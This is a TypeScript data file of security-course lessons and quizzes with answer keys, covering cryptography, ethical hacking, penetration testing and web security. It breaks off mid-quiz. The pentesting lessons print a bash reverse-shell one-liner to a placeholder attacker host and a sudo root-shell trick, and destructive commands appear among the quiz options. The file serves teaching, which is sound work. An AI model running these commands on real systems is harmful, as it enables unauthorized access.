import type { Lesson } from '../courses'

export const intermediateCurriculum: Record<string, Lesson[]> = {
  'course-cryptography': [
    {
      title: 'AES-GCM & Symmetric Encryption',
      duration: '8 min',
      body: [
        'Symmetric cryptography uses the same secret key for both encryption and decryption. The Advanced Encryption Standard (AES) is the gold standard block cipher approved by NIST, processing data in fixed 128-bit (16-byte) blocks with key sizes of 128, 192, or 256 bits.',
        'Early block cipher modes like Electronic Codebook (ECB) encrypt identical plaintext blocks into identical ciphertext blocks, preserving data patterns (such as the infamous ECB Penguin). Cipher Block Chaining (CBC) introduced Initialization Vectors (IVs) to randomize blocks, but CBC remains vulnerable to Padding Oracle attacks unless accompanied by a separate message authentication code.',
        'Galois/Counter Mode (AES-GCM) is modern Authenticated Encryption with Associated Data (AEAD). It combines counter-mode stream encryption with Galois field authentication, producing both ciphertext and an authentication tag. This ensures Confidentiality and Integrity simultaneously. A critical rule: the 96-bit Initialization Vector (IV/nonce) must NEVER be repeated with the same key; nonce reuse in GCM enables catastrophic key recovery.'
      ],
      takeaway: 'AES-GCM provides authenticated encryption (AEAD); never reuse an Initialization Vector (IV/nonce) with the same secret key.',
      question: 'What catastrophic vulnerability occurs if the same Initialization Vector (nonce) is reused across multiple encryptions under AES-GCM?',
      options: [
        'Adversaries can recover the authentication key and forge authentic ciphertexts',
        'The hard drive sectors are physically erased',
        'The key automatically lengthens from 128 bits to 512 bits',
        'The encryption speed drops to zero bytes per second'
      ],
      answer: 0,
      explanation: 'In AES-GCM, nonce reuse destroys the authentication integrity guarantees, allowing an eavesdropper to compute the GHASH authentication key and forge arbitrary messages.'
    },
    {
      title: 'Cryptographic Hashing & Salting',
      duration: '8 min',
      body: [
        'A cryptographic hash function maps arbitrary-length input data to a fixed-length string of bytes. Secure hash functions (such as SHA-256 and SHA-3) must satisfy three mathematical properties: Pre-image resistance (impossible to reverse the hash back to plaintext), Second pre-image resistance (given input $x$, impossible to find distinct input $y$ where $H(x) = H(y)$), and Collision resistance (impossible to find any two inputs that produce identical hashes).',
        'Legacy hash algorithms such as MD5 (128-bit) and SHA-1 (160-bit) are broken and cryptographically vulnerable to practical collisions. They must never be used for digital signatures or authentication.',
        'Fast cryptographic hashes (like raw SHA-256) are dangerous for password storage because attackers can calculate billions of guesses per second on consumer GPUs using precomputed Rainbow Tables. Secure password hashing requires slow, memory-hard Key Derivation Functions (KDFs) such as bcrypt, PBKDF2, or Argon2id, combined with a cryptographically random Salt (at least 16 bytes) unique to each user to defeat rainbow tables.'
      ],
      takeaway: 'Never use raw SHA-256 or MD5 for passwords; use slow, salted, memory-hard algorithms like Argon2id or bcrypt.',
      question: 'Why is standard SHA-256 unsuitable for storing user account passwords in modern web databases?',
      options: [
        'Because GPUs can compute billions of SHA-256 hashes per second, making brute-force dictionary attacks trivial',
        'Because SHA-256 can be reversed mathematically by anyone with a calculator',
        'Because SHA-256 only runs on 32-bit computers',
        'Because SHA-256 hashes expire after 24 hours'
      ],
      answer: 0,
      explanation: 'SHA-256 is designed to be fast for data integrity, which allows attackers utilizing graphics processors to crack billions of candidate passwords per second. Passwords require deliberately slow, memory-intensive KDFs like Argon2id.'
    },
    {
      title: 'HMACs & Message Authentication',
      duration: '7 min',
      body: [
        'A Hash-based Message Authentication Code (HMAC, RFC 2104) verifies both the data integrity and the authentic origin of a message. It involves hashing the message together with a secret shared key using a cryptographic hash function (e.g., HMAC-SHA256).',
        'Naively concatenating a key and message, such as `Hash(Key || Message)`, is vulnerable to Length Extension Attacks in Merkle-Damgård hash constructions (MD5, SHA-1, SHA-256). An attacker who intercepts the hash and message can append their own data and compute a valid hash without ever knowing the secret key.',
        'HMAC prevents length extension attacks by using a nested two-pass hashing construction: `HMAC(K, m) = H((K\' ⊕ opad) || H((K\' ⊕ ipad) || m))`, where `ipad` and `opad` are fixed byte padding constants. HMACs are widely used in API request signing (e.g., AWS Signature Version 4) and webhook payload verification.'
      ],
      takeaway: 'HMAC uses a two-pass nested construction to guarantee message authenticity while preventing hash length extension attacks.',
      question: 'What vulnerability occurs if a developer constructs a signature using naive concatenation `Hash(SecretKey || Message)` with SHA-256 instead of HMAC?',
      options: [
        'Length Extension Attack',
        'Buffer Overflow',
        'SQL Injection',
        'Cross-Site Scripting'
      ],
      answer: 0,
      explanation: 'Merkle-Damgård hash functions (MD5, SHA-1, SHA-256) allow an attacker to extend the message and compute a valid updated hash state without knowing the original prepended secret key.'
    },
    {
      title: 'Diffie-Hellman Key Exchange',
      duration: '8 min',
      body: [
        'The Diffie-Hellman (DH) key exchange protocol, invented in 1976, revolutionized cryptography by allowing two parties (Alice and Bob) to establish a shared secret key over an insecure, publicly monitored channel without transmitting the key itself.',
        'The protocol relies on the mathematical difficulty of the Discrete Logarithm Problem in finite modular arithmetic (or on elliptic curves): Alice and Bob agree on a public prime $p$ and base $g$. Each selects a secret private integer ($a$ and $b$), computes their public key ($A = g^a \\pmod p$, $B = g^b \\pmod p$), and exchanges them. Both calculate the shared secret $S = B^a \\pmod p = A^b \\pmod p = g^{ab} \\pmod p$. An eavesdropper observing $g, p, A, B$ cannot efficiently compute $S$.',
        'Modern protocols mandate Ephemeral Diffie-Hellman (DHE or ECDHE). Generating fresh, temporary keys for every single session provides Perfect Forward Secrecy (PFS). If the server\'s long-term private master key is compromised in the future, past recorded encrypted communications cannot be retroactively decrypted.'
      ],
      takeaway: 'Ephemeral Diffie-Hellman (ECDHE) provides Perfect Forward Secrecy, protecting past encrypted traffic even if private keys are later stolen.',
      question: 'What vital security property does Ephemeral Diffie-Hellman (ECDHE) provide in modern TLS connections?',
      options: [
        'Perfect Forward Secrecy (PFS)',
        'Zero Latency TCP Streaming',
        'Hardware BIOS Recovery',
        'Automatic Password Recovery'
      ],
      answer: 0,
      explanation: 'Perfect Forward Secrecy (PFS) ensures that session keys are generated dynamically per handshake and discarded, so compromising the server\'s private key in the future cannot decrypt past recorded sessions.'
    },
    {
      title: 'RSA & Elliptic Curve Cryptography (ECC)',
      duration: '9 min',
      body: [
        'Asymmetric (Public Key) cryptography uses key pairs: a Public Key for encryption or signature verification (distributed freely), and a Private Key for decryption or signing (kept secret).',
        'RSA derives its security from the practical difficulty of factoring the product of two massive prime numbers ($n = p \\times q$). To provide 128-bit equivalent security today, RSA requires a minimum key length of 2048 or 3072 bits, which incurs high computational and battery overhead.',
        'Elliptic Curve Cryptography (ECC), utilizing curves such as NIST P-256 or Curve25519 (Ed25519 for signatures, X25519 for key exchange), achieves equivalent or superior cryptographic strength with dramatically smaller keys. A 256-bit ECC key matches the security of a 3072-bit RSA key, drastically reducing CPU usage, memory consumption, and network handshake sizes on mobile and IoT devices.'
      ],
      takeaway: 'ECC provides equal security to 3072-bit RSA with just 256-bit keys, reducing power and latency in modern TLS handshakes.',
      question: 'Which asymmetric cryptographic approach achieves equivalent security to a 3072-bit RSA key using only a 256-bit key size?',
      options: [
        'Elliptic Curve Cryptography (ECC)',
        'Single DES',
        'MD5 Hashing',
        'Caesar Cipher'
      ],
      answer: 0,
      explanation: 'Elliptic Curve Cryptography (ECC) relies on the algebraic structure of elliptic curves over finite fields, providing equal cryptographic strength with much smaller key sizes (256-bit ECC ≈ 3072-bit RSA).'
    },
    {
      title: 'TLS 1.3 Handshake & X.509 Certificates',
      duration: '9 min',
      body: [
        'Transport Layer Security (TLS) encrypts web traffic over HTTPS. X.509 Digital Certificates bind an organization\'s domain name to a public key, cryptographically signed by a trusted Certificate Authority (CA) whose root certificate resides in the browser\'s or OS\'s trust store.',
        'TLS 1.3 modernized the cryptographic handshake by eliminating legacy, insecure algorithms (MD5, SHA-1, RC4, DES, static RSA key exchange). In TLS 1.3, the entire cryptographic negotiation completes in just 1-RTT (Round Trip Time) compared to 2-RTT in TLS 1.2, or 0-RTT via pre-shared keys.',
        'The TLS 1.3 handshake sequence: Client sends `ClientHello` offering supported cipher suites (e.g., `TLS_AES_256_GCM_SHA384`) and an initial ECDHE key share → Server replies with `ServerHello` choosing cipher and sending its ECDHE share, X.509 Certificate, and cryptographic signature → Both compute the symmetric session key, and all further traffic is encrypted immediately.'
      ],
      takeaway: 'TLS 1.3 mandates ephemeral Diffie-Hellman key exchange and completes the secure encrypted handshake in a single round-trip (1-RTT).',
      question: 'Why did TLS 1.3 completely remove static RSA key exchange from the specification?',
      options: [
        'Static RSA key exchange does not provide Perfect Forward Secrecy',
        'RSA keys cannot be used over fiber-optic cables',
        'RSA is copyrighted and cannot be used in open-source software',
        'RSA requires web browsers to install Adobe Flash'
      ],
      answer: 0,
      explanation: 'Static RSA key exchange allowed anyone with access to the server\'s private key to decrypt all past recorded sessions. TLS 1.3 mandates Ephemeral Diffie-Hellman to guarantee Perfect Forward Secrecy.'
    }
  ],

  'course-ethical-hacking': [
    {
      title: 'Legal Boundaries & Authorized Scopes',
      duration: '8 min',
      body: [
        'Ethical hacking, penetration testing, and security research must operate strictly within legally authorized boundaries. The critical differentiator between an ethical hacker and a cybercriminal is explicit, written Authorization from the asset owner.',
        'Before testing begins, both parties execute three legal documents: a Non-Disclosure Agreement (NDA), a Master Services Agreement (MSA), and the Rules of Engagement (RoE). The RoE defines the exact Scope: in-scope target IP ranges, domain names, approved testing hours, forbidden targets (e.g., production payment gateways, third-party hosting partners), and authorized techniques.',
        'Testing without explicit written consent violates severe anti-hacking legislation, including the US Computer Fraud and Abuse Act (CFAA) and international computer misuse laws, risking severe felony charges. When testing cloud environments (AWS, Azure, GCP), researchers must strictly adhere to the provider\'s published Penetration Testing Rules of Engagement.'
      ],
      takeaway: 'Explicit written Rules of Engagement (RoE) define what is in scope; testing without authorization is illegal under the CFAA.',
      question: 'Which legal document explicitly defines in-scope IP ranges, approved testing hours, and prohibited activities prior to a penetration test?',
      options: [
        'Rules of Engagement (RoE)',
        'DMCA Copyright Waiver',
        'Software End User License Agreement (EULA)',
        'W-2 Tax Form'
      ],
      answer: 0,
      explanation: 'The Rules of Engagement (RoE) details the exact authorized scope, emergency communication contacts, allowed and forbidden testing methodologies, and timeline constraints.'
    },
    {
      title: 'Passive Reconnaissance Tactics',
      duration: '8 min',
      body: [
        'Reconnaissance is the initial phase of ethical hacking. Passive reconnaissance gathers intelligence about the target organization without transmitting any packets directly to the target\'s servers or infrastructure, ensuring the tester remains entirely invisible to target intrusion detection systems.',
        'Essential passive techniques include: Certificate Transparency logs (querying `crt.sh` to uncover all subdomains for which TLS certificates were issued, discovering hidden staging domains), DNS aggregators (SecurityTrails, AlienVault OTX), and public code repositories (GitHub, GitLab) for exposed configuration files and API keys.',
        'Autonomous System Number (ASN) mapping with BGP tools (e.g., `whois -h whois.radb.net`) identifies all public IP netblocks owned by an enterprise. By synthesizing these passive data sources, an ethical hacker builds a comprehensive asset inventory before ever sending a single probe.'
      ],
      takeaway: 'Passive reconnaissance leverages third-party repositories and Certificate Transparency logs to discover attack surface without alerting defenders.',
      question: 'Which public repository service allows researchers to discover forgotten subdomains by inspecting publicly logged TLS/SSL certificates?',
      options: [
        'Certificate Transparency Logs (e.g., crt.sh)',
        'BGP Looking Glass',
        'The Linux Kernel Archives',
        'Apache Software Foundation'
      ],
      answer: 0,
      explanation: 'Certificate Transparency (CT) logs record all issued public SSL/TLS certificates, allowing researchers to search crt.sh for a domain and immediately discover active staging, dev, and internal subdomains.'
    },
    {
      title: 'Active Scanning & Fingerprinting',
      duration: '9 min',
      body: [
        'Active scanning involves transmitting network packets directly to target hosts to discover live systems, open ports, running services, and operating system fingerprints. Nmap (Network Mapper) is the industry-standard tool for network exploration.',
        'Nmap supports multiple scanning techniques: TCP SYN Scan (`-sS`, the default "stealth" scan that sends SYN and records SYN-ACK without completing the handshake, minimizing application log footprint), TCP Connect Scan (`-sT`, completes the full 3-way handshake, necessary when unprivileged), and UDP Scan (`-sU`, testing stateless UDP services like DNS, SNMP, NTP).',
        'Service version detection (`-sV`) queries open ports with protocol-specific probe strings to capture exact service banners (e.g., `Apache 2.4.41` on Ubuntu). OS detection (`-O`) evaluates subtleties in TCP/IP stack implementations (window sizes, TTL defaults, TCP options). Nmap\'s Scripting Engine (NSE, `-sC`) automates vulnerability checks and advanced service enumeration.'
      ],
      takeaway: 'Nmap SYN scanning (`-sS`) identifies open ports without completing TCP handshakes; `-sV` captures service versions for vulnerability mapping.',
      question: 'Why is the Nmap TCP SYN scan (`-sS`) referred to as a "half-open" or stealth scan?',
      options: [
        'It sends a SYN packet and listens for SYN-ACK, but resets (RST) the connection before sending the final ACK',
        'It encrypts scan traffic using quantum cryptography',
        'It runs only when the target server is powered down',
        'It bypasses physical fiber-optic cables'
      ],
      answer: 0,
      explanation: 'A SYN scan terminates the TCP handshake by sending an immediate RST packet upon receiving a SYN-ACK, preventing application-level server daemons from logging a completed connection.'
    },
    {
      title: 'Vulnerability Scanning Principles',
      duration: '8 min',
      body: [
        'Vulnerability scanning automates the process of identifying known security flaws, outdated software components, and missing patches across networks and web applications. Enterprise scanners include Nessus, Qualys, Rapid7 InsightVM, and open-source OpenVAS (Greenbone).',
        'Scans operate in two modes: Authenticated (Credentialed) scans and Unauthenticated (Network) scans. Unauthenticated scans probe open ports externally, guessing versions from banners. Authenticated scans log in using a designated service account (via SSH on Linux or WinRM on Windows) to inspect local package managers, registry settings, and installed software versions directly.',
        'A critical skill for ethical hackers is distinguishing True Positives from False Positives. Automated scanners frequently flag vulnerabilities based solely on software banner strings, failing to recognize backported security patches applied by enterprise distributions like Debian or Red Hat. Testers must manually verify findings before including them in reports.'
      ],
      takeaway: 'Authenticated scans provide deep visibility into missing patches; ethical hackers must verify automated findings to eliminate false positives.',
      question: 'What is the primary advantage of an Authenticated (Credentialed) vulnerability scan over an Unauthenticated network scan?',
      options: [
        'It logs directly into the host to inspect internal registry keys and installed package patch levels with high accuracy',
        'It runs without requiring any network connectivity',
        'It automatically fixes all discovered vulnerabilities',
        'It makes the scanning process completely invisible to the CPU'
      ],
      answer: 0,
      explanation: 'Credentialed scans log directly into the target OS, allowing the scanner to inspect file versions, software registries, and local configurations with far higher accuracy and far fewer false positives.'
    },
    {
      title: 'CVSS v3.1 Scoring Framework',
      duration: '8 min',
      body: [
        'The Common Vulnerability Scoring System (CVSS v3.1) provides an open, standardized framework for assessing the severity of software vulnerabilities, producing a numerical score from 0.0 to 10.0 and severity ratings (None, Low, Medium, High, Critical).',
        'The CVSS Base Score evaluates intrinsic vulnerability characteristics across two sub-metrics: Exploitability (Attack Vector: Network, Adjacent, Local, Physical; Attack Complexity: Low, High; Privileges Required: None, Low, High; User Interaction: None, Required; and Scope: Unchanged, Changed) and Impact (Confidentiality, Integrity, and Availability: None, Low, High).',
        'A score of 10.0 (Critical) represents an unauthenticated, remote code execution flaw across the network requiring zero user interaction with total loss of confidentiality, integrity, and availability (such as Log4Shell or EternalBlue). Organizations use CVSS scores to prioritize patching within Service Level Agreements (SLAs).'
      ],
      takeaway: 'CVSS v3.1 standardizes vulnerability severity (0.0 - 10.0) based on exploitability metrics and confidentiality, integrity, and availability impact.',
      question: 'What CVSS v3.1 severity rating is assigned to a vulnerability with a Base Score of 9.8?',
      options: [
        'Critical (9.0 - 10.0)',
        'High (7.0 - 8.9)',
        'Medium (4.0 - 6.9)',
        'Low (0.1 - 3.9)'
      ],
      answer: 0,
      explanation: 'Under CVSS v3.1, scores between 9.0 and 10.0 are classified as Critical, demanding immediate remediation response.'
    },
    {
      title: 'Reporting & Responsible Disclosure',
      duration: '8 min',
      body: [
        'The final and most crucial deliverable of an ethical hacking engagement is the Penetration Testing Report. The report bridges technical findings with business risk, enabling executive leaders and engineering teams to remediate exposures.',
        'A professional report comprises two key sections: An Executive Summary (written in non-technical business language detailing overall security posture, strategic risks, and high-level recommendations for C-suite leadership) and Detailed Technical Findings (including vulnerability descriptions, CVSS scores, step-by-step reproduction proofs-of-concept, root-cause analyses, and concrete remediation guidance).',
        'Responsible Disclosure is the ethical framework governing independent researchers discovering zero-day vulnerabilities in software vendors. The researcher notifies the vendor privately, providing a reasonable remediation grace period (typically 90 days according to Google Project Zero guidelines) before publishing advisories publicly, protecting end users from premature exploitation.'
      ],
      takeaway: 'An executive summary translates risk for leadership; responsible disclosure grants vendors private notice (usually 90 days) to release patches.',
      question: 'What standard timeline grace period is recommended under coordinated responsible vulnerability disclosure policies before public advisory release?',
      options: [
        '90 days',
        '24 hours',
        '5 years',
        '10 minutes'
      ],
      answer: 0,
      explanation: 'Coordinated disclosure guidelines (such as Google Project Zero) typically provide vendors 90 days from initial private notification to develop, test, and release a security patch before public disclosure.'
    }
  ],

  'course-pentesting': [
    {
      title: 'Identifying Exploitable Services',
      duration: '8 min',
      body: [
        'Penetration testing moves beyond vulnerability scanning to actively validating whether discovered vulnerabilities can be leveraged to compromise target systems. Exploitation begins by mapping port scan results against verified public vulnerability databases (such as Exploit-DB, NIST NVD, and GitHub security advisories).',
        'When evaluating a service, penetration testers look for low-hanging fruit: default credentials on administration interfaces (e.g., `admin:admin` on Tomcat Manager, pfSense, or IP cameras), unpatched remote code execution vulnerabilities in exposed services (e.g., MS17-010 EternalBlue on SMBv1, or ProFTPD 1.3.5 mod_copy), and misconfigured protocols (e.g., anonymous FTP uploads or unauthenticated NFS shares).',
        'Exploitation must be conducted methodically: testers verify the target software build and patch level to avoid deploying unreliable exploit payloads that could crash production services or trigger kernel panics (Denial of Service).'
      ],
      takeaway: 'Match service version banners against known CVEs; verify exploit stability in lab environments before attempting execution against target hosts.',
      question: 'Why must penetration testers thoroughly verify exploit stability before running exploit code against a target production service?',
      options: [
        'Unstable exploits can crash the service or trigger a kernel panic, causing an unintended Denial of Service outage',
        'Exploits run out of disk space on the tester\'s laptop',
        'Exploit scripts are automatically sent to social media',
        'Exploits permanently delete the internet router'
      ],
      answer: 0,
      explanation: 'Poorly written or memory-unstable exploits risk corrupting server process memory or crashing the kernel, causing outages that violate engagement rules.'
    },
    {
      title: 'Payload Delivery in Isolated Labs',
      duration: '9 min',
      body: [
        'Once a vulnerability is identified, attackers deliver a payload to gain initial access. The most common interactive payload is a Shell: either a Bind Shell (the target system listens on a local port and waits for the attacker to connect) or a Reverse Shell (the target system initiates an outbound connection back to the attacker\'s listening machine).',
        'Reverse shells are vastly preferred because enterprise network firewalls and NAT devices almost always block unsolicited inbound connections from the Internet, but frequently allow outbound TCP connections on common ports like 80, 443, or 53.',
        'A simple Netcat listener on the attacker machine (`nc -lvnp 4444`) catches outbound reverse shells executed on the victim: e.g., via bash (`bash -i >& /dev/tcp/attacker_ip/4444 0>&1`), Python, or PowerShell. In penetration testing, payloads are generated and staged using frameworks like Metasploit (`msfvenom`) or custom shellcode loaders.'
      ],
      takeaway: 'Reverse shells initiate outbound connections to bypass inbound firewall rules; Netcat catches incoming shell sessions on listening ports.',
      question: 'Why do penetration testers prefer Reverse Shells over Bind Shells when establishing access to compromised internal hosts?',
      options: [
        'Perimeter firewalls generally block unsolicited incoming connections but permit outbound connections from internal hosts',
        'Reverse shells require no network bandwidth',
        'Bind shells can only run on Windows 95 computers',
        'Reverse shells automatically crack the root password'
      ],
      answer: 0,
      explanation: 'Corporate firewalls block incoming connections from the Internet to internal hosts, but allow internal systems to establish outbound connections on standard ports like 443 or 80.'
    },
    {
      title: 'Understanding Buffer Overflows',
      duration: '9 min',
      body: [
        'A Stack-Based Buffer Overflow occurs when a program writes more data to a memory buffer allocated on the stack than the buffer was designed to hold, without enforcing bounds checking. This flaw is common in C/C++ applications using unsafe string functions like `strcpy()`, `gets()`, and `sprintf()`.',
        'In classic x86 stack memory layout, function local variables sit immediately adjacent to the Saved Frame Pointer (EBP) and the crucial Saved Return Address (EIP). If an attacker supplies an oversized payload (e.g., 200 bytes of input into an 80-byte buffer), the overflow spills down the stack, overwriting EBP and ultimately overwriting the saved EIP.',
        'By overwriting EIP with the address of their injected shellcode (or an instruction like `JMP ESP`), the attacker hijacks control flow the moment the vulnerable function returns. Modern defenses against buffer overflows include Stack Canaries (random cookies placed before the return address that trigger a crash if modified), ASLR (randomizing memory layouts), and DEP (marking the stack non-executable).'
      ],
      takeaway: 'Buffer overflows overwrite the saved return address (EIP/RIP); stack canaries, ASLR, and DEP mitigate control flow hijacking.',
      question: 'What defensive mechanism places a random secret value on the stack immediately before the saved return address to detect buffer overflow attempts?',
      options: [
        'Stack Canary (Cookie)',
        'Subnet Mask',
        'DHCP Lease',
        'DNS Resolver'
      ],
      answer: 0,
      explanation: 'A Stack Canary is a compiler-generated random integer placed before the saved return address; if an overflow overwrites it, the program halts immediately before execution returns.'
    },
    {
      title: 'Linux Local Privilege Escalation (SUID, Sudo)',
      duration: '9 min',
      body: [
        'After gaining initial unprivileged access (e.g., as `www-data`), a penetration tester must escalate privileges to `root`. Linux local privilege escalation exploits misconfigurations, excessive permissions, or kernel bugs.',
        'A prime vector is `sudo` misconfiguration. Running `sudo -l` lists the commands the current user can execute with elevated privileges. If the user can run standard binaries (such as `find`, `vim`, `less`, `awk`, or `nmap`) as root without a password, the tester can leverage GTFOBins techniques: for example, `sudo find . -exec /bin/sh \\; -quit` spawns an instant root shell.',
        'Other privilege escalation vectors include SUID binaries with custom scripting vulnerabilities, writable `/etc/passwd` files (allowing an attacker to insert a new root user entry with a known password hash), and vulnerable cron jobs running scripts located in world-writable directories.'
      ],
      takeaway: '`sudo -l` reveals sudo privileges; GTFOBins documents how standard UNIX binaries can be manipulated to spawn elevated root shells.',
      question: 'What command should a security analyst run first upon gaining an unprivileged shell on a Linux system to inspect allowed sudo execution rules?',
      options: [
        'sudo -l',
        'rm -rf /',
        'cat /etc/shadow',
        'systemctl reboot'
      ],
      answer: 0,
      explanation: '`sudo -l` queries the `/etc/sudoers` configuration to list all commands the current user is authorized to execute with elevated root privileges.'
    },
    {
      title: 'Windows Privilege Escalation Vectors',
      duration: '9 min',
      body: [
        'On Windows systems, elevating from a standard domain user or local account to `NT AUTHORITY\\SYSTEM` involves exploiting Windows-specific configuration flaws, services, and token privileges.',
        'Unquoted Service Paths represent a classic configuration error. If a Windows service binary path contains spaces and is not enclosed in quotation marks (e.g., `C:\\Program Files\\My Service\\service.exe`), the Windows service control manager resolves the path sequentially, checking `C:\\Program.exe`, then `C:\\Program Files\\My.exe`. If an unprivileged user has write permissions in `C:\\`, they can drop a malicious `Program.exe` that executes as SYSTEM when the service starts.',
        'Token impersonation exploits abuse privileges like `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (frequently held by service accounts like IIS). Tools in the "Potato" family (RottenPotato, PrintSpoofer, SweetPotato) coerce local RPC authentication and intercept SYSTEM tokens to spawn elevated command prompts.'
      ],
      takeaway: 'Unquoted service paths and `SeImpersonatePrivilege` abuse are premier avenues for escalating to `NT AUTHORITY\\SYSTEM` in Windows.',
      question: 'Which tool family is famous in Windows penetration testing for abusing `SeImpersonatePrivilege` to escalate from service accounts to SYSTEM?',
      options: [
        'Potato family (PrintSpoofer, JuicyPotato, SweetPotato)',
        'Wireshark',
        'Nmap NSE',
        'Burp Suite Repeater'
      ],
      answer: 0,
      explanation: 'Potato exploits (e.g. JuicyPotato, PrintSpoofer) trick privileged Windows RPC/COM services into authenticating against a local rogue server, capturing and impersonating the SYSTEM token.'
    },
    {
      title: 'Post-Exploitation & Lateral Movement Basics',
      duration: '8 min',
      body: [
        'Post-exploitation encompasses the actions taken after compromising an initial host: looting local credentials, establishing persistence, and pivoting laterally across the internal enterprise network to reach high-value targets (such as Active Directory Domain Controllers).',
        'Pivoting uses the compromised host as a network bridge (jump box). Using SSH Dynamic Port Forwarding (`ssh -D 1080 user@compromised_host`) creates a local SOCKS4/5 proxy on the tester\'s machine. Paired with `proxychains`, the tester can route external tools (Nmap, browser, Impacket) directly into the victim\'s private internal subnet.',
        'Lateral movement techniques in Windows environments include Pass-the-Hash (PtH, authenticating via NTLM hash without knowing the plaintext password), PsExec (executing remote services via SMB named pipes), and WMI (Windows Management Instrumentation) command execution.'
      ],
      takeaway: 'Pivoting with SOCKS proxies and SSH tunnels routes testing tools into private enterprise subnets through compromised jump hosts.',
      question: 'What technique allows an attacker to authenticate over SMB to a remote Windows host using only a captured NTLM hash without cracking the plaintext password?',
      options: [
        'Pass-the-Hash (PtH)',
        'SQL Injection',
        'ARP Spoofing',
        'DNS Tunneling'
      ],
      answer: 0,
      explanation: 'Pass-the-Hash (PtH) leverages the Windows NTLM authentication protocol flaw where the challenge-response is derived directly from the NTLM hash, rendering plaintext password cracking unnecessary.'
    }
  ],

  'course-web-sec': [
    {
      title: 'HTTP Request/Response Anatomy',
      duration: '7 min',
      body: [
        'The Hypertext Transfer Protocol (HTTP) is the stateless, text-based application protocol governing the World Wide Web. An HTTP Request consists of: a Request Line (Method, Path, HTTP Version), Headers (key-value pairs conveying host, user-agent, cookies, content-type), an empty line (`\\r\\n`), and an optional Request Body (containing POST parameters or JSON).',
        'Standard HTTP methods define operations: GET (safe, idempotent retrieval), POST (submitting data, creating resources), PUT (replacing resources), PATCH (partial updates), and DELETE. The server returns an HTTP Response with a Status Line: 2xx Success (200 OK, 201 Created), 3xx Redirection (301 Moved Permanently, 302 Found), 4xx Client Error (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found), and 5xx Server Error (500 Internal Server Error, 502 Bad Gateway).',
        'Web security testing relies on web interception proxies (such as PortSwigger Burp Suite or OWASP ZAP). A proxy sits between the browser and web server, capturing raw HTTP requests and responses, allowing testers to tamper with parameters, inject payloads, and inspect server replies.'
      ],
      takeaway: 'HTTP is a stateless text protocol; web proxies like Burp Suite intercept and manipulate raw requests and response headers.',
      question: 'Which HTTP response status code signifies that the client is authenticated but lacks permission to access the requested resource?',
      options: [
        '403 Forbidden',
        '401 Unauthorized',
        '404 Not Found',
        '500 Server Error'
      ],
      answer: 0,
      explanation: '403 Forbidden indicates the server understands the user\'s identity but refuses access due to insufficient privileges. 401 Unauthorized indicates authentication is missing altogether.'
    },
    {
      title: 'Cookies, Sessions, & Stateless JWTs',
      duration: '8 min',
      body: [
        'Because HTTP is stateless, web applications implement session management to remember authenticated users. In traditional stateful sessions, the server creates a unique session ID in memory or a database (e.g., Redis) and transmits it to the browser in a `Set-Cookie` header. The browser automatically attaches this cookie to all subsequent requests.',
        'Session cookies must be hardened with security attributes: `Secure` (ensures cookies are only transmitted over encrypted HTTPS), `HttpOnly` (blocks client-side JavaScript from accessing `document.cookie`, mitigating Cross-Site Scripting session theft), and `SameSite` (`Strict` or `Lax`, blocking unauthorized cross-site cookie transmission to prevent CSRF attacks).',
        'JSON Web Tokens (JWT) provide stateless authentication. A JWT consists of three Base64URL-encoded components separated by dots: Header (algorithm), Payload (claims: sub, exp, role), and Signature (`HMACSHA256(header + "." + payload, secret)`). Stateless JWTs cannot be invalidated before expiration unless the server maintains a revocation denylist.'
      ],
      takeaway: 'Always apply `Secure`, `HttpOnly`, and `SameSite=Strict` flags to session cookies to prevent theft and CSRF abuse.',
      question: 'Which cookie security attribute prevents client-side JavaScript (`document.cookie`) from reading the cookie, neutralizing XSS session hijacking?',
      options: [
        'HttpOnly',
        'Secure',
        'SameSite',
        'Domain'
      ],
      answer: 0,
      explanation: 'The `HttpOnly` flag instructs the browser that the cookie should not be accessible via client-side scripts, protecting session tokens from theft via Cross-Site Scripting (XSS).'
    },
    {
      title: 'Same-Origin Policy & CORS Headers',
      duration: '8 min',
      body: [
        'The Same-Origin Policy (SOP) is the foundational security boundary enforced by modern web browsers. It restricts scripts running on one origin (defined as the exact tuple of Scheme, Hostname, and Port) from reading DOM elements or sensitive API responses from another origin.',
        'For example, `https://bank.com` and `https://api.bank.com` are different origins because their hostnames differ. Under SOP, an attacker\'s website (`https://evil.com`) cannot use `fetch()` to read a user\'s banking balance at `https://bank.com/api/balance`, even if the user\'s session cookies are attached.',
        'Cross-Origin Resource Sharing (CORS) is a mechanism that relaxes SOP selectively. The server sends response headers such as `Access-Control-Allow-Origin: https://trusted-partner.com` and `Access-Control-Allow-Credentials: true`. A dangerous security misconfiguration occurs when servers reflect arbitrary incoming `Origin` headers with `Allow-Credentials: true`, completely bypassing the Same-Origin Policy and allowing malicious sites to steal user data.'
      ],
      takeaway: 'Same-Origin Policy prevents rogue sites from reading cross-origin data; misconfigured CORS headers (`*` with credentials) re-expose private data.',
      question: 'Which three components must match identically for two web addresses to share the Same Origin under the browser Same-Origin Policy (SOP)?',
      options: [
        'Scheme (Protocol), Hostname (Domain), and Port',
        'Domain name, URL Path, and Query String',
        'IP Address, MAC Address, and Operating System',
        'Browser version, Screen resolution, and Language'
      ],
      answer: 0,
      explanation: 'Under the Same-Origin Policy, two URLs have the same origin if and only if their protocol scheme (e.g. https), hostname (e.g. example.com), and port (e.g. 443) match exactly.'
    },
    {
      title: 'Authentication Vulnerabilities & Brute-force',
      duration: '8 min',
      body: [
        'Authentication systems verify user identity. Flaws in authentication architecture expose applications to Credential Stuffing (testing millions of username/password pairs leaked from other breaches) and Password Spraying (testing a single common password, like `Winter2026!`, against thousands of usernames to evade account lockout thresholds).',
        'Common authentication vulnerabilities include: Username Enumeration (where server responses differ between valid and invalid usernames via differing error messages or response times), lack of Rate Limiting on login endpoints, and insecure "Remember Me" tokens generated from predictable hashes.',
        'Robust defense requires multi-layered controls: enforcing Multi-Factor Authentication (MFA with FIDO2/WebAuthn hardware keys or TOTP), rate limiting via IP and username buckets, generic error messages ("Invalid username or password"), and monitoring authentication telemetry for anomalous geolocation velocities (impossible travel).'
      ],
      takeaway: 'Defend authentication with MFA, IP/account rate limiting, and generic error messages to eliminate username enumeration.',
      question: 'What authentication defense technique thwarts password spraying by restricting the frequency of login attempts allowed across an IP address or account?',
      options: [
        'Rate Limiting / Throttling',
        'CORS preflighting',
        'Base64 encoding',
        'DNS round-robin'
      ],
      answer: 0,
